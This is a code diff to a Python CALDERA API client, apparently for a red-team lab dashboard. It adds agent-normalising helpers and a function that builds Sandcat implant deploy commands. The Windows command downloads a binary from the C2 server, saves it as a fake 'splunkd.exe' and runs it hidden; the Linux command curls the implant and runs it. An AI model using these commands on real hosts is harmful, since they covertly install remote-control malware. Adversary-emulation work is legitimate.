@@ -1,11 +1,15 @@
+
 import os
 import logging
+import re
+from pathlib import Path
+from urllib.parse import urlparse, urlunparse
 from typing import Any
 
 import requests
 from dotenv import load_dotenv
 
-load_dotenv()
+load_dotenv(Path(__file__).resolve().parents[1] / ".env")
 
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger(__name__)
@@ -22,6 +26,8 @@ class CalderaClient:
 
         self.session = requests.Session()
         if self.api_key:
+            # CALDERA's REST API expects the KEY header. Keep Content-Type here
+            # so every JSON request is accepted consistently by /api/v2 routes.
             self.session.headers.update({
                 "KEY": self.api_key,
                 "Content-Type": "application/json"
@@ -40,13 +46,13 @@ class CalderaClient:
             )
             response.raise_for_status()
 
-            if response.text:
+            if response.text and response.text.strip():
                 return response.json()
 
             return {}
 
         except requests.exceptions.RequestException as e:
-            raise CalderaAPIError(f"Caldera API request failed: {e}")
+            raise CalderaAPIError(f"Caldera API request failed for {method} {url}: {e}")
 
         except ValueError:
             raise CalderaAPIError("Caldera returned a non-JSON response.")
@@ -64,35 +70,101 @@ class CalderaClient:
     def list_agents(self):
         return self._request("GET", "/api/v2/agents")
 
-    def get_online_agents(self):
+    def _normalise_bool(self, value):
+        if isinstance(value, bool):
+            return value
+        if isinstance(value, str):
+            return value.strip().lower() in {"true", "trusted", "yes", "1"}
+        return bool(value)
+
+    def _unwrap_collection(self, value, keys):
+        """
+        CALDERA versions/plugins return lists either directly or under keys
+        such as agents, abilities, payloads, data, or objects. This keeps the
+        rest of the app independent from that small API shape difference.
+        """
+        if isinstance(value, list):
+            return value
+        if not isinstance(value, dict):
+            return []
+        for key in keys:
+            nested = value.get(key)
+            if isinstance(nested, list):
+                return nested
+        for nested in value.values():
+            if isinstance(nested, list):
+                return nested
+        return []
+
+    def _agent_is_alive(self, agent):
+        raw = agent.get("alive")
+        if raw is not None:
+            return self._normalise_bool(raw)
+        status = str(agent.get("status") or agent.get("state") or "").lower()
+        if status in {"dead", "offline", "untrusted"}:
+            return False
+        if status in {"alive", "online", "trusted", "running"}:
+            return True
+        return True
+
+    def _normalise_agent(self, agent):
+        trusted = self._normalise_bool(agent.get("trusted"))
+        host = agent.get("host") or agent.get("host_name") or agent.get("hostname") or "unknown"
+        last_seen = agent.get("last_seen") or agent.get("last_seen_time") or agent.get("last_seen_at")
+        ip = (
+            agent.get("host_ip_addrs")
+            or agent.get("host_ip")
+            or agent.get("host_ipv4")
+            or agent.get("host_address")
+            or agent.get("ip")
+            or agent.get("address")
+            or ""
+        )
+        if isinstance(ip, list):
+            ip_addrs = [str(item) for item in ip if item]
+            ip = ", ".join(ip_addrs)
+        else:
+            ip = ", ".join(re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", str(ip))) or str(ip or "")
+            ip_addrs = [item for item in re.findall(r"(?:\d{1,3}\.){3}\d{1,3}", ip)]
+
+        return {
+            "paw": agent.get("paw"),
+            "host": host,
+            "hostname": host,
+            "ip": ip,
+            "host_ip_addrs": ip_addrs,
+            "platform": agent.get("platform") or agent.get("os") or agent.get("architecture") or "unknown",
+            "group": agent.get("group"),
+            "last_seen": last_seen,
+            "trusted": trusted,
+            "alive": self._agent_is_alive(agent),
+            "status": "Online" if self._agent_is_alive(agent) else "Offline",
+            "raw": agent,
+        }
+
+    def get_agents_normalized(self):
         agents = self.list_agents()
+        agents = self._unwrap_collection(agents, ("agents", "data", "objects"))
 
-        if isinstance(agents, dict):
-            agents = agents.get("agents", [])
+        return [self._normalise_agent(agent) for agent in agents or []]
 
-        online = []
+    def get_online_agents(self):
+        return [
+            agent
+            for agent in self.get_agents_normalized()
+            if agent.get("trusted") and agent.get("alive") and agent.get("paw")
+        ]
 
-        for agent in agents:
-            trusted = agent.get("trusted")
-            paw = agent.get("paw")
-            host = agent.get("host") or agent.get("host_name")
-
-            if trusted is True:
-                online.append({
-                    "paw": paw,
-                    "host": host,
-                    "platform": agent.get("platform"),
-                    "group": agent.get("group"),
-                    "last_seen": agent.get("last_seen"),
-                    "host_ip_addrs": agent.get("host_ip_addrs", []),
-                })
-
-        return online
+    def delete_agent(self, paw):
+        return self._request("DELETE", f"/api/v2/agents/{paw}")
 
     def list_operations(self):
         return self._request("GET", "/api/v2/operations")
     def get_abilities(self):
         return self._request("GET", "/api/v2/abilities")
+
+    def get_payloads(self):
+        return self._request("GET", "/api/v2/payloads")
 
 
     def create_adversary(self, name, ability_ids):
@@ -110,9 +182,7 @@ class CalderaClient:
 
     def get_adversary_by_name(self, name):
         adversaries = self._request("GET", "/api/v2/adversaries")
-
-        if isinstance(adversaries, dict):
-            adversaries = adversaries.get("adversaries", [])
+        adversaries = self._unwrap_collection(adversaries, ("adversaries", "data", "objects"))
 
         for adv in adversaries:
             if adv.get("name", "").lower() == name.lower():
@@ -170,3 +240,114 @@ class CalderaClient:
                 matches.append(ability)
 
         return matches
+
+    # Compatibility aliases / helpers for older test scripts and callers
+    def ping(self):
+        """Backward-compatible ping method used by tests.
+        Returns True if Caldera appears reachable, False otherwise.
+        """
+        try:
+            # Prefer the health endpoint when available
+            self.health_check()
+            return True
+        except CalderaAPIError:
+            try:
+                # Fallback to listing agents as a pragmatic connectivity check
+                self.list_agents()
+                return True
+            except CalderaAPIError:
+                return False
+
+    def get_agents(self):
+        """Alias for list_agents() returning a list of agents."""
+        agents = self.list_agents()
+        return self._unwrap_collection(agents, ("agents", "data", "objects"))
+
+    def get_adversaries(self):
+        """Return list of adversaries."""
+        adv = self._request("GET", "/api/v2/adversaries")
+        return self._unwrap_collection(adv, ("adversaries", "data", "objects"))
+
+    def status(self):
+        try:
+            agents = self.list_agents()
+            return {
+                "ready": True,
+                "status_code": 200,
+                "detail": "reachable",
+                "agents": agents,
+            }
+        except CalderaAPIError as exc:
+            return {
+                "ready": False,
+                "status_code": getattr(exc, "status_code", 500),
+                "detail": str(exc),
+            }
+
+    def _reachable_server_url(self, fallback_host=None):
+        parsed = urlparse(self.base_url)
+        if parsed.hostname in {"127.0.0.1", "localhost", "0.0.0.0"} and fallback_host:
+            netloc = fallback_host
+            if parsed.port and ":" not in fallback_host:
+                netloc = f"{fallback_host}:{parsed.port}"
+            return urlunparse((parsed.scheme or "http", netloc, parsed.path, "", "", ""))
+        if parsed.hostname in {"127.0.0.1", "localhost", "0.0.0.0"}:
+            return None
+        return self.base_url
+
+    def _sandcat_payload_name(self, platform='windows'):
+        try:
+            payloads = self.get_payloads()
+        except CalderaAPIError:
+            payloads = []
+
+        payloads = self._unwrap_collection(payloads, ("payloads", "data", "objects"))
+
+        names = []
+        for payload in payloads or []:
+            if isinstance(payload, str):
+                names.append(payload)
+            elif isinstance(payload, dict):
+                names.append(payload.get("name") or payload.get("file") or payload.get("payload") or "")
+
+        if "sandcat.go" in names:
+            return "sandcat.go"
+        return "sandcat.go"
+
+    def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
+        """
+        Return the copyable Sandcat deploy command shown in the dashboard.
+
+        Keep the Windows command in the compact CALDERA style because it is
+        intended to be pasted as one editable PowerShell paragraph.
+        """
+        server = self._reachable_server_url(kali_ip)
+        if not server:
+            return (
+                "$server=\"http://CHANGE-ME:8888\"; # change CHANGE-ME to your Kali VM IP"
+            )
+        payload_name = self._sandcat_payload_name(platform)
+
+        if "win" in str(platform or "").lower():
+            return (
+                f"$server=\"{server}\";"
+                "$url=\"$server/file/download\";"
+                "$wc=New-Object System.Net.WebClient;"
+                "$wc.Headers.add(\"platform\",\"windows\");"
+                f"$wc.Headers.add(\"file\",\"{payload_name}\");"
+                "$data=$wc.DownloadData($url);"
+                "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;"
+                "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;"
+                "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;"
+                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\" -WindowStyle hidden;"
+            )
+
+        return (
+            f"server='{server}'; "
+            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat; "
+            f"chmod +x sandcat; ./sandcat -server \"$server\" -group {group}"
+        )
+
+    def get_adversary_list(self):
+        """Alias for get_adversaries() - backwards compatibility."""
+        return self.get_adversaries()
